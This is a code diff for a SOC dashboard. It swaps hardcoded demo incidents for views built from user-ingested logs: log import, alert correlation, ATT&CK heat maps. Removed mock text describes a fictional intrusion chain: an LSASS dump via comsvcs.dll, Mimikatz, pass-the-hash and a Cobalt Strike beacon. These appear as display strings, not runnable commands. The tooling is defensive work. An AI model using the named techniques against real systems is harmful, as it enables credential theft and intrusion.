-                  '<span>' + esc(s.shift) + '</span>' +
-                  '<span style="color:var(--mut)">' + s.analysts.join(', ') + '</span>' +
-                  '<span style="color:var(--acc)">' + s.alerts + ' alerts</span>' +
-                '</div>';
-              }).join('') +
-            '</div>' +
+            }).join('') : '<div class="ct-empty" style="padding:16px">No alerts assigned yet. Assign alerts in Alert Triage.</div>') +
           '</div>' +
         '</div>' +
       '</div>' +
@@ -1475,79 +1605,84 @@ export function renderCitadel(main) {
         '<div class="ct-panel">' +
           '<div class="ct-panel-h">Top MITRE ATT&CK Techniques</div>' +
           '<div class="ct-panel-b">' +
-            '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
-              SOC_METRICS.topMitre.map(function(m) {
+            (techKeys.length ? '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
+              techKeys.map(function(id) {
                 return '<div class="ct-stat" style="min-width:120px">' +
-                  '<div style="font-size:.62rem;color:var(--acc);font-weight:600">' + esc(m.id) + '</div>' +
-                  '<div style="font-size:.68rem;margin-top:2px">' + esc(m.name) + '</div>' +
-                  '<div style="font-size:1rem;font-weight:700;margin-top:4px">' + m.count + '</div>' +
+                  '<div style="font-size:.62rem;color:var(--acc);font-weight:600">' + esc(id) + '</div>' +
+                  '<div style="font-size:.68rem;margin-top:2px">' + esc(ctTechInfo(id).name) + '</div>' +
+                  '<div style="font-size:1rem;font-weight:700;margin-top:4px">' + m.techs[id] + '</div>' +
                 '</div>';
               }).join('') +
-            '</div>' +
+            '</div>' : noData) +
           '</div>' +
         '</div>' +
 
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Active Kill Chain Coverage</div>' +
+          '<div class="ct-panel-h">Kill Chain Coverage (alerts per tactic)</div>' +
           '<div class="ct-panel-b">' +
-            ['Reconnaissance:2:#ffd600','Initial Access:3:#ff9100','Execution:5:#ff1744','Persistence:3:#ff1744','Priv Escalation:2:#ff9100','Defense Evasion:2:#ff1744','Credential Access:4:#ff1744','Discovery:3:#ff9100','Lateral Movement:2:#ff9100','Collection:1:#ffd600','Exfiltration:1:#ff1744','C2:3:#ff1744'].map(function(s) {
-              var p = s.split(':');
-              var w = Math.min(100, parseInt(p[1]) * 15);
+            (tacticKeys.length ? tacticKeys.map(function(t) {
+              var n = m.tactics[t];
+              var w = Math.min(100, n * 15);
               return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:.62rem">' +
-                '<span style="min-width:100px;color:var(--mut)">' + p[0] + '</span>' +
-                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + w + '%;background:' + p[2] + '"></div></div>' +
-                '<span style="min-width:20px;text-align:right;font-weight:600;color:' + p[2] + '">' + p[1] + '</span>' +
+                '<span style="min-width:100px;color:var(--mut)">' + esc(t) + '</span>' +
+                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + w + '%;background:#ff9100"></div></div>' +
+                '<span style="min-width:20px;text-align:right;font-weight:600">' + n + '</span>' +
               '</div>';
-            }).join('') +
+            }).join('') : noData) +
           '</div>' +
         '</div>' +
       '</div>' +
 
       '<div class="ct-panel" style="margin-bottom:12px">' +
-        '<div class="ct-panel-h" style="color:#ff1744">Active Incidents</div>' +
+        '<div class="ct-panel-h" style="color:#ff1744">Active Incidents (alerts correlated by shared host within 60m)</div>' +
         '<div class="ct-panel-b">' +
+          (incidents.length ?
           '<table class="ct-tbl">' +
-            '<thead><tr><th>Incident</th><th>Title</th><th>Severity</th><th>Status</th><th>Lead</th><th>Started</th><th>Affected Assets</th></tr></thead>' +
+            '<thead><tr><th>Primary Host</th><th>Alerts</th><th>Peak Severity</th><th>Tactics</th><th>Started</th><th>Affected Hosts</th></tr></thead>' +
             '<tbody>' +
-              '<tr><td style="color:var(--acc);font-weight:600">INC-001</td><td>Cobalt Strike C2 on WS-JSMITH-01</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-inv">Containment</span></td><td>Analyst-1</td><td>08:07:00</td><td>WS-JSMITH-01, DC-01, FS-01</td></tr>' +
-              '<tr><td style="color:var(--acc);font-weight:600">INC-002</td><td>Data Exfiltration via HTTPS</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-esc">Escalated</span></td><td>Analyst-2</td><td>08:41:00</td><td>10.0.2.100, FS-01</td></tr>' +
-              '<tr><td style="color:var(--acc);font-weight:600">INC-003</td><td>AWS IAM Backdoor User Created</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-new">Triage</span></td><td>Unassigned</td><td>08:16:00</td><td>AWS Account, S3:sensitive-data-prod</td></tr>' +
-              '<tr><td style="color:var(--acc);font-weight:600">INC-004</td><td>Ransomware Activity on 10.0.2.150</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-inv">Investigating</span></td><td>Analyst-2</td><td>08:28:00</td><td>10.0.2.150, network shares</td></tr>' +
+              incidents.map(function(x) {
+                return '<tr><td style="color:var(--acc);font-weight:600">' + esc(x.primary || 'unknown') + '</td><td>' + x.members.length + '</td>' +
+                  '<td><span class="ct-badge ' + ({Critical:'ct-crit',High:'ct-high',Medium:'ct-med'}[x.peak] || 'ct-low') + '">' + esc(x.peak) + '</span></td>' +
+                  '<td style="font-size:.6rem">' + esc(x.tacticSeq.join(' -> ')) + '</td>' +
+                  '<td>' + x.start.toLocaleTimeString('en-US',{hour12:false}) + '</td>' +
+                  '<td style="font-size:.6rem">' + esc(x.hosts.slice(0,4).join(', ')) + '</td></tr>';
+              }).join('') +
             '</tbody>' +
-          '</table>' +
+          '</table>' : '<div class="ct-empty" style="padding:16px">No open incidents. Incidents are built automatically from your alerts.</div>') +
         '</div>' +
       '</div>' +
 
       '<div class="ct-panel">' +
-        '<div class="ct-panel-h">Alert Volume by Day (Last 7 Days)</div>' +
+        '<div class="ct-panel-h">Alert Volume by Day</div>' +
         '<div class="ct-panel-b">' +
+          (m.days.length ?
           '<div class="ct-trend" style="height:80px">' +
-            SOC_METRICS.alertVolume.week.map(function(v,i) {
-              var h = Math.round((v / Math.max.apply(null,SOC_METRICS.alertVolume.week)) * 100);
-              var days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+            m.days.map(function(d) {
+              var max = Math.max.apply(null, m.days.map(function(x){return x.count;}).concat([1]));
+              var h = Math.round((d.count / max) * 100);
               return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
-                '<div style="font-size:.55rem;color:var(--mut)">' + v + '</div>' +
+                '<div style="font-size:.55rem;color:var(--mut)">' + d.count + '</div>' +
                 '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%"></div></div>' +
-                '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
+                '<div style="font-size:.5rem;color:var(--mut)">' + esc(d.day) + '</div>' +
               '</div>';
             }).join('') +
-          '</div>' +
+          '</div>' : noData) +
         '</div>' +
       '</div>' +
 
       '<div class="ct-panel" style="margin-top:12px">' +
-        '<div class="ct-panel-h">MITRE ATT&CK Heat Map</div>' +
+        '<div class="ct-panel-h">MITRE ATT&CK Heat Map (detection rule coverage + your alerts)</div>' +
         '<div class="ct-panel-b" style="overflow-x:auto">' +
           '<div style="display:flex;gap:2px;min-width:900px">' +
             MITRE_MATRIX.map(function(tac) {
               var coveredCount = tac.techniques.filter(function(t){return t.covered}).length;
-              var totalAlerts = tac.techniques.reduce(function(s,t){return s+t.alerts},0);
               return '<div style="flex:1;min-width:60px">' +
                 '<div style="font-size:.5rem;font-weight:600;text-align:center;padding:4px 2px;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.2);border-radius:2px;margin-bottom:2px;color:var(--acc)">' + esc(tac.tactic) + '</div>' +
                 tac.techniques.map(function(tech) {
-                  var bg = tech.alerts > 3 ? 'rgba(255,23,68,.5)' : tech.alerts > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.15)' : 'rgba(255,255,255,.03)';
-                  var border = tech.alerts > 3 ? 'rgba(255,23,68,.5)' : tech.alerts > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.2)' : 'var(--line)';
-                  return '<div style="font-size:.42rem;text-align:center;padding:3px 1px;background:' + bg + ';border:1px solid ' + border + ';border-radius:1px;margin-bottom:1px;cursor:pointer" title="' + esc(tech.id + ' ' + tech.name + (tech.alerts > 0 ? ' (' + tech.alerts + ' alerts)' : '')) + '">' + esc(tech.id.replace('T','')) + '</div>';
+                  var n = ALERTS.filter(function(a){ return a.mitre && String(a.mitre).split('.')[0] === tech.id; }).length;
+                  var bg = n > 3 ? 'rgba(255,23,68,.5)' : n > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.15)' : 'rgba(255,255,255,.03)';
+                  var border = n > 3 ? 'rgba(255,23,68,.5)' : n > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.2)' : 'var(--line)';
+                  return '<div style="font-size:.42rem;text-align:center;padding:3px 1px;background:' + bg + ';border:1px solid ' + border + ';border-radius:1px;margin-bottom:1px;cursor:pointer" title="' + esc(tech.id + ' ' + tech.name + (n > 0 ? ' (' + n + ' alerts)' : '')) + '">' + esc(tech.id.replace('T','')) + '</div>';
                 }).join('') +
                 '<div style="font-size:.45rem;text-align:center;color:var(--mut);margin-top:2px">' + coveredCount + '/' + tac.techniques.length + '</div>' +
               '</div>';
@@ -1556,7 +1691,7 @@ export function renderCitadel(main) {
           '<div style="display:flex;gap:12px;margin-top:8px;font-size:.5rem;color:var(--mut)">' +
             '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,23,68,.5);border-radius:1px;vertical-align:middle"></span> Active (&gt;3 alerts)</span>' +
             '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,145,0,.3);border-radius:1px;vertical-align:middle"></span> Detected (1-3)</span>' +
-            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(0,230,118,.15);border-radius:1px;vertical-align:middle"></span> Covered (no alerts)</span>' +
+            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(0,230,118,.15);border-radius:1px;vertical-align:middle"></span> Covered by a rule (no alerts)</span>' +
             '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:1px;vertical-align:middle"></span> No coverage</span>' +
           '</div>' +
         '</div>' +
@@ -1564,40 +1699,39 @@ export function renderCitadel(main) {
 
       '<div class="ct-grid2" style="margin-top:12px">' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">IOC Summary (' + IOC_DATABASE.length + ' indicators)</div>' +
+          '<div class="ct-panel-h">Hosts and IPs in Your Alerts (' + Object.keys(m.assets).length + ')</div>' +
           '<div class="ct-panel-b" style="max-height:250px;overflow-y:auto">' +
-            IOC_DATABASE.slice(0,12).map(function(ioc) {
-              var typeColor = ioc.type==='ip'?'#00e5ff':ioc.type==='domain'?'#ff9100':ioc.type==='hash'?'#7c4dff':ioc.type==='email'?'#e040fb':'#00e676';
-              var classColor = ioc.classification==='Malicious'?'#ff1744':'#ffd600';
+            (assetKeys.length ? assetKeys.map(function(k) {
+              var r = m.assets[k];
+              var isIp = /^\d{1,3}(\.\d{1,3}){3}$/.test(k);
+              var typeColor = isIp ? '#00e5ff' : '#ff9100';
               return '<div style="display:flex;gap:6px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.6rem">' +
-                '<span class="ct-tag" style="background:' + typeColor + '22;color:' + typeColor + ';border-color:' + typeColor + '44;min-width:50px;text-align:center">' + ioc.type.toUpperCase() + '</span>' +
-                '<span style="flex:1;font-family:inherit;word-break:break-all">' + esc(ioc.value) + '</span>' +
-                '<span style="color:' + classColor + ';font-weight:600;font-size:.55rem">' + esc(ioc.classification) + '</span>' +
-                '<span style="color:var(--mut);font-size:.5rem">' + ioc.confidence + '%</span>' +
+                '<span class="ct-tag" style="background:' + typeColor + '22;color:' + typeColor + ';border-color:' + typeColor + '44;min-width:50px;text-align:center">' + (isIp ? 'IP' : 'HOST') + '</span>' +
+                '<span style="flex:1;font-family:inherit;word-break:break-all">' + esc(k) + '</span>' +
+                '<span style="color:var(--mut);font-size:.55rem">' + r.alerts + ' alert' + (r.alerts === 1 ? '' : 's') + '</span>' +
+                (r.crit ? '<span style="color:#ff1744;font-weight:600;font-size:.55rem">' + r.crit + ' critical</span>' : '') +
               '</div>';
-            }).join('') +
+            }).join('') : noData) +
           '</div>' +
         '</div>' +
 
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Log Ingestion Pipeline</div>' +
+          '<div class="ct-panel-h">Ingested Log Sources</div>' +
           '<div class="ct-panel-b" style="max-height:250px;overflow-y:auto">' +
-            INGESTION_PIPELINE.map(function(p) {
-              var statusColor = p.status==='healthy'?'#00e676':p.status==='warning'?'#ffd600':'#ff1744';
+            (logSrcKeys.length ? logSrcKeys.map(function(k) {
+              var p = k.split('||');
               return '<div style="display:flex;gap:6px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.6rem">' +
-                '<span style="width:6px;height:6px;border-radius:50%;background:' + statusColor + ';flex-shrink:0"></span>' +
-                '<span style="min-width:130px;font-weight:600">' + esc(p.source) + '</span>' +
-                '<span style="min-width:50px;color:var(--mut)">' + p.format + '</span>' +
-                '<span style="min-width:50px;color:var(--acc);font-weight:600">' + p.eps.toLocaleString() + ' EPS</span>' +
-                '<span style="min-width:30px;color:var(--mut)">' + p.latency + '</span>' +
-                '<span style="color:' + statusColor + ';font-weight:600;font-size:.5rem;text-transform:uppercase">' + p.status + '</span>' +
+                '<span style="min-width:130px;font-weight:600">' + esc(p[1]) + '</span>' +
+                '<span style="min-width:50px;color:var(--mut)">' + esc(p[0].toUpperCase()) + '</span>' +
+                '<span style="flex:1"></span>' +
+                '<span style="color:var(--acc);font-weight:600">' + logSrc[k] + ' events</span>' +
               '</div>';
             }).join('') +
             '<div style="display:flex;justify-content:space-between;margin-top:8px;font-size:.62rem;color:var(--mut);border-top:1px solid var(--line);padding-top:6px">' +
-              '<span>Total EPS: <strong style="color:var(--acc)">' + INGESTION_PIPELINE.reduce(function(s,p){return s+p.eps},0).toLocaleString() + '</strong></span>' +
-              '<span>Sources: <strong>' + INGESTION_PIPELINE.length + '</strong></span>' +
-              '<span>Healthy: <strong style="color:#00e676">' + INGESTION_PIPELINE.filter(function(p){return p.status==='healthy'}).length + '/' + INGESTION_PIPELINE.length + '</strong></span>' +
-            '</div>' +
+              '<span>Total events: <strong style="color:var(--acc)">' + logs.length + '</strong></span>' +
+              '<span>Sources: <strong>' + Object.keys(logSrc).length + '</strong></span>' +
+            '</div>'
+            : '<div class="ct-empty" style="padding:16px">No logs ingested yet.</div>') +
           '</div>' +
         '</div>' +
       '</div>' +
@@ -1605,25 +1739,25 @@ export function renderCitadel(main) {
       '<div class="ct-panel" style="margin-top:12px">' +
         '<div class="ct-panel-h">Threat Attribution Analysis</div>' +
         '<div class="ct-panel-b">' +
-          '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Based on observed TTPs, the following threat actor profiles are relevant:</div>' +
-          THREAT_ACTORS.map(function(ta) {
-            var confColor = ta.confidence==='High'?'#ff1744':ta.confidence==='Medium'?'#ff9100':'#ffd600';
+          (actorHits.length ?
+          '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Known actor profiles whose documented TTPs overlap the ATT&CK techniques in your alerts (overlap only, not attribution):</div>' +
+          actorHits.map(function(x) {
+            var ta = x.ta;
             return '<div style="margin-bottom:8px;padding:8px;border:1px solid var(--line);border-radius:4px;background:rgba(0,0,0,.1)">' +
               '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">' +
                 '<span style="font-size:.72rem;font-weight:600">' + esc(ta.name) + '</span>' +
                 '<div style="display:flex;gap:4px">' +
                   '<span class="ct-tag">' + esc(ta.nation) + '</span>' +
-                  '<span class="ct-badge" style="color:' + confColor + ';border-color:' + confColor + '">Conf: ' + esc(ta.confidence) + '</span>' +
+                  '<span class="ct-badge ct-info">' + x.seen.length + ' / ' + ta.ttps.length + ' TTPs seen</span>' +
                 '</div>' +
               '</div>' +
-              '<div style="font-size:.6rem;color:var(--acc);margin-bottom:4px">' + esc(ta.relevance) + '</div>' +
+              '<div style="font-size:.6rem;color:var(--acc);margin-bottom:4px">Matched: ' + esc(x.seen.join(', ')) + '</div>' +
               '<div style="display:flex;gap:16px;font-size:.58rem;color:var(--mut)">' +
-                '<span>Sectors: ' + ta.sectors.slice(0,3).join(', ') + '</span>' +
-                '<span>TTPs: ' + ta.ttps.slice(0,4).join(', ') + '</span>' +
-                '<span>Tools: ' + ta.tools.slice(0,3).join(', ') + '</span>' +
+                '<span>Sectors: ' + esc(ta.sectors.slice(0,3).join(', ')) + '</span>' +
+                '<span>Tools: ' + esc(ta.tools.slice(0,3).join(', ')) + '</span>' +
               '</div>' +
             '</div>';
-          }).join('') +
+          }).join('') : '<div class="ct-empty" style="padding:16px">No actor overlap yet. Overlap appears once your alerts carry ATT&amp;CK technique IDs.</div>') +
         '</div>' +
       '</div>' +
 
@@ -1648,6 +1782,7 @@ export function renderCitadel(main) {
           '</div>' +
         '</div>' +
       '</div>';
+    wireEmptyActions(c);
   }
 
   // ========== LOG EXPLORER ==========
@@ -1665,6 +1800,22 @@ export function renderCitadel(main) {
 
     c.innerHTML =
       '<div class="ct-panel">' +
+        '<div class="ct-panel-h"><span style="flex:1">Import Logs</span>' +
+          (allLogs.length || ALERTS.length ? '<button class="ct-btn ct-btn-sm ct-btn-ghost" id="ct-imp-clear">Clear all data</button>' : '') +
+        '</div>' +
+        '<div class="ct-panel-b">' +
+          '<textarea class="ct-textarea" id="ct-imp-text" placeholder="Paste log lines or JSON..."></textarea>' +
+          '<div style="font-size:.6rem;color:var(--mut);margin-top:4px;line-height:1.5">One event per line: syslog, CEF, LEEF, JSON or web access logs. A JSON array of objects with title and severity imports as alerts. Data stays in this browser tab.</div>' +
+          '<div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;align-items:center">' +
+            '<button class="ct-btn ct-btn-sm" id="ct-imp-go">Ingest</button>' +
+            '<label class="ct-btn ct-btn-sm ct-btn-ghost" style="display:inline-block">Upload file<input type="file" id="ct-imp-file" accept=".log,.txt,.json,.csv,.cef,.leef" style="display:none"></label>' +
+            '<span style="flex:1"></span>' +
+            (CT_DATA.exampleLoaded ? '' : '<button class="ct-btn ct-btn-sm ct-btn-ghost" id="ct-imp-example" title="Loads a fictional example dataset (logs + alerts) for exploring the tool">Load example data</button>') +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+      (allLogs.length ? '' : ctEmptyState('No logs yet. Paste or upload logs above to search, hunt and create alerts from them.')) +
+      '<div' + (allLogs.length ? '' : ' style="display:none"') + '><div class="ct-panel">' +
         '<div class="ct-panel-h">Log Explorer - ' + allLogs.length + ' events loaded</div>' +
         '<div class="ct-panel-b">' +
           '<div class="ct-filter-row">' +
@@ -1796,7 +1947,29 @@ export function renderCitadel(main) {
         '</div>' +
       '</div>' +
 
-      '<div id="ct-log-detail"></div>';
+      '</div><div id="ct-log-detail"></div>';
+
+    function afterIngest(r) {
+      if (!r.logs && !r.alerts) { ctToast('Nothing to ingest', 'warning'); return; }
+      ctToast('Ingested ' + r.logs + ' log event' + (r.logs === 1 ? '' : 's') + (r.alerts ? ' and ' + r.alerts + ' alert' + (r.alerts === 1 ? '' : 's') : ''), 'success');
+      renderLogExplorer(c);
+    }
+    c.querySelector('#ct-imp-go').onclick = function() { afterIngest(ctIngestText(c.querySelector('#ct-imp-text').value)); };
+    c.querySelector('#ct-imp-file').onchange = function(e) {
+      var file = e.target.files && e.target.files[0];
+      if (!file) return;
+      var reader = new FileReader();
+      reader.onload = function() { afterIngest(ctIngestText(String(reader.result || ''))); };
+      reader.readAsText(file);
+    };
+    var exBtn = c.querySelector('#ct-imp-example');
+    if (exBtn) exBtn.onclick = function() { ctLoadExample(); ctToast('Example data loaded (fictional)', 'info'); renderLogExplorer(c); };
+    var clrBtn = c.querySelector('#ct-imp-clear');
+    if (clrBtn) clrBtn.onclick = function() {
+      var go = function() { ctClearData(); renderLogExplorer(c); };
+      if (typeof window.dnConfirm === 'function') window.dnConfirm('Clear all data?', 'Removes every ingested log and alert from this session.', {danger:true, submitText:'Clear'}).then(function(ok){ if (ok) go(); });
+      else go();
+    };
 
     c.querySelector('#ct-fmt-filter').onchange = function(e) {
       logFilter.format = e.target.value; renderLogExplorer(c);
@@ -1861,13 +2034,19 @@ export function renderCitadel(main) {
               '</div>'
             : '') +
             '<div style="display:flex;gap:6px;margin-top:10px">' +
-              '<button class="ct-btn ct-btn-sm">Create Alert</button>' +
+              '<button class="ct-btn ct-btn-sm" id="ct-log-mkalert">Create Alert</button>' +
               '<button class="ct-btn ct-btn-sm ct-btn-ghost">Add to Hunt</button>' +
               '<button class="ct-btn ct-btn-sm ct-btn-ghost">Export Event</button>' +
               '<button class="ct-btn ct-btn-sm ct-btn-ghost">Find Related</button>' +
             '</div>' +
           '</div>' +
         '</div>';
+      var mk = detailEl.querySelector('#ct-log-mkalert');
+      if (mk) mk.onclick = function() {
+        var a = ctAlertFromLog(log);
+        mk.disabled = true; mk.textContent = 'Created ' + a.id;
+        ctToast('Alert ' + a.id + ' added to triage queue', 'success');
+      };
     };
 
     var logListEl = c.querySelector('#ct-log-list');
@@ -2049,47 +2228,33 @@ export function renderCitadel(main) {
       '<div class="ct-panel">' +
         '<div class="ct-panel-h">Recent Correlation Matches</div>' +
         '<div class="ct-panel-b">' +
-          '<table class="ct-tbl">' +
-            '<thead><tr><th>Time</th><th>Rule</th><th>Severity</th><th>Source</th><th>Events Matched</th><th>Action Taken</th></tr></thead>' +
-            '<tbody>' +
-              '<tr><td>08:30:30</td><td>Brute Force + Login</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4625 x3 &rarr; 4624</td><td>Alert Generated</td></tr>' +
-              '<tr><td>08:32:00</td><td>Privilege Escalation Chain</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4624 &rarr; 4672 &rarr; 4688</td><td>Alert + Isolate</td></tr>' +
-              '<tr><td>08:35:00</td><td>Persistence Installation</td><td><span class="ct-badge ct-high">High</span></td><td>DC-01</td><td>4688 (cmd) &rarr; 7045</td><td>Alert Generated</td></tr>' +
-              '<tr><td>08:37:00</td><td>Data Staging and Exfil</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4663 x45 &rarr; POST 450MB</td><td>Alert + Block</td></tr>' +
-              '<tr><td>08:34:30</td><td>Defense Evasion</td><td><span class="ct-badge ct-crit">Critical</span></td><td>DC-01</td><td>4689 (AV) &rarr; 1102</td><td>Alert + Restore</td></tr>' +
-              '<tr><td>08:42:00</td><td>Lateral Movement</td><td><span class="ct-badge ct-high">High</span></td><td>10.0.2.100</td><td>4624 (A) &rarr; 5156 (445) &rarr; 4624 (B)</td><td>Alert Generated</td></tr>' +
-            '</tbody>' +
-          '</table>' +
+          '<div class="ct-empty">No correlation matches recorded. Correlated alert chains from your data appear in Attack Chain Reconstruction below.</div>' +
         '</div>' +
       '</div>' +
 
-      '<div class="ct-grid2" style="margin-top:12px">' +
+      (function() {
+        // Derived from the user's alerts: largest correlated incident + live stats.
+        var incs = ALERTS.length ? ctBuildIncidents(ALERTS, 60 * 60 * 1000) : [];
+        var chains = incs.filter(function(x){ return x.members.length >= 2; });
+        var critChains = chains.filter(function(x){ return x.peak === 'Critical'; });
+        var top = chains[0];
+        return '<div class="ct-grid2" style="margin-top:12px">' +
         '<div class="ct-panel">' +
           '<div class="ct-panel-h">Attack Chain Reconstruction</div>' +
           '<div class="ct-panel-b">' +
-            '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Correlated kill chain from observed events on 10.0.2.100</div>' +
-            [
-              {step:'1. Initial Access',detail:'SSH brute force from 185.220.101.34 (Tor exit), successful auth as svc-admin',time:'08:01-08:04',sev:'high'},
-              {step:'2. Execution',detail:'PowerShell with encoded command, downloads shell.ps1 from 10.0.2.100:8080',time:'08:32:00',sev:'crit'},
-              {step:'3. Persistence',detail:'Registry Run key + Scheduled task + Service install pointing to Temp directory',time:'08:35:00',sev:'high'},
-              {step:'4. Privilege Escalation',detail:'SeDebugPrivilege assigned, pass-the-hash to domain admin',time:'08:31:00',sev:'crit'},
-              {step:'5. Defense Evasion',detail:'Security audit log cleared on DC-01, AV process terminated',time:'08:34:30',sev:'crit'},
-              {step:'6. Credential Access',detail:'Mimikatz dropped, LSASS dump via comsvcs.dll, Kerberoasting (RC4 TGS)',time:'08:34-08:38',sev:'crit'},
-              {step:'7. Discovery',detail:'net group, nltest, dsquery for AD enumeration, LDAP objectClass=* search',time:'08:39-08:40',sev:'high'},
-              {step:'8. Lateral Movement',detail:'SMB admin share access to FS-01, 10.0.2.200 via pass-the-hash',time:'08:42:00',sev:'high'},
-              {step:'9. Collection',detail:'Mass file access on Finance$, HR$, IT$ shares (45+ files in 1min)',time:'08:36-08:37',sev:'high'},
-              {step:'10. Exfiltration',detail:'450MB HTTPS transfer to 198.51.100.50 detected and blocked',time:'08:41:00',sev:'crit'},
-              {step:'11. Command & Control',detail:'Cobalt Strike beacon to 45.33.32.156:443, 60s interval with jitter',time:'08:07-ongoing',sev:'crit'},
-            ].map(function(s) {
-              var sevBorder = s.sev==='crit'?'#ff1744':'#ff9100';
+            (top ?
+            '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Largest correlated chain in your alerts, centered on ' + esc(top.primary || 'unknown') + '</div>' +
+            top.chain.map(function(a, i) {
+              var sevBorder = a.severity==='Critical'?'#ff1744':a.severity==='High'?'#ff9100':'#ffd600';
               return '<div style="display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-left:3px solid ' + sevBorder + ';padding-left:10px;margin-left:8px;margin-bottom:4px">' +
                 '<div style="min-width:140px">' +
-                  '<div style="font-size:.68rem;font-weight:600;color:' + sevBorder + '">' + esc(s.step) + '</div>' +
-                  '<div style="font-size:.55rem;color:var(--mut)">' + esc(s.time) + '</div>' +
+                  '<div style="font-size:.68rem;font-weight:600;color:' + sevBorder + '">' + (i + 1) + '. ' + esc(ctTechInfo(a.mitre).tactic) + '</div>' +
+                  '<div style="font-size:.55rem;color:var(--mut)">' + new Date(a.timestamp).toLocaleTimeString('en-US',{hour12:false}) + '</div>' +
                 '</div>' +
-                '<div style="font-size:.65rem;color:var(--txt)">' + esc(s.detail) + '</div>' +
+                '<div style="font-size:.65rem;color:var(--txt)">' + esc(a.title) + (a.mitre ? ' <span style="color:var(--acc)">' + esc(a.mitre) + '</span>' : '') + '</div>' +
               '</div>';
-            }).join('') +
+            }).join('')
+            : '<div class="ct-empty">No multi-alert chains yet. Chains form when two or more of your alerts share a host or IP within 60 minutes.</div>') +
           '</div>' +
         '</div>' +
 
@@ -2097,36 +2262,15 @@ export function renderCitadel(main) {
           '<div class="ct-panel-h">Correlation Statistics</div>' +
           '<div class="ct-panel-b">' +
             '<div class="ct-grid2" style="margin-bottom:12px">' +
-              '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">6</div><div class="ct-stat-l">Rules Triggered (24h)</div></div>' +
-              '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">4</div><div class="ct-stat-l">Critical Chains</div></div>' +
-              '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">89<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">True Positive Rate</div></div>' +
-              '<div class="ct-stat"><div class="ct-stat-v">3.2<span style="font-size:.6rem">min</span></div><div class="ct-stat-l">Avg Detection Time</div></div>' +
-            '</div>' +
-            '<div style="margin-bottom:8px">' +
-              '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Rule Effectiveness (Last 30 Days)</div>' +
-              [
-                {name:'Brute Force + Login',hits:23,fp:2},
-                {name:'Priv Escalation Chain',hits:8,fp:1},
-                {name:'Lateral Movement',hits:15,fp:3},
-                {name:'Data Staging + Exfil',hits:5,fp:0},
-                {name:'Account Takeover',hits:12,fp:4},
-                {name:'Persistence Install',hits:18,fp:2},
-                {name:'Defense Evasion',hits:3,fp:0},
-                {name:'Cloud Credential',hits:7,fp:1},
-              ].map(function(r) {
-                var maxHits = 23;
-                var w = Math.round((r.hits / maxHits) * 100);
-                return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
-                  '<span style="min-width:130px;color:var(--mut)">' + esc(r.name) + '</span>' +
-                  '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + w + '%;background:var(--acc)"></div></div>' +
-                  '<span style="min-width:30px;text-align:right;font-weight:600">' + r.hits + '</span>' +
-                  '<span style="min-width:20px;text-align:right;color:' + (r.fp>0?'#ff9100':'#00e676') + '">' + r.fp + ' FP</span>' +
-                '</div>';
-              }).join('') +
+              '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + ALERTS.length + '</div><div class="ct-stat-l">Alerts Analyzed</div></div>' +
+              '<div class="ct-stat"><div class="ct-stat-v">' + chains.length + '</div><div class="ct-stat-l">Multi-Alert Chains</div></div>' +
+              '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + critChains.length + '</div><div class="ct-stat-l">Critical Chains</div></div>' +
+              '<div class="ct-stat"><div class="ct-stat-v">' + (incs.length - chains.length) + '</div><div class="ct-stat-l">Standalone Alerts</div></div>' +
             '</div>' +
           '</div>' +
         '</div>' +
       '</div>';
+      })();
 
     c.querySelectorAll('.ct-rule-card').forEach(function(card) {
       card.onclick = function() {
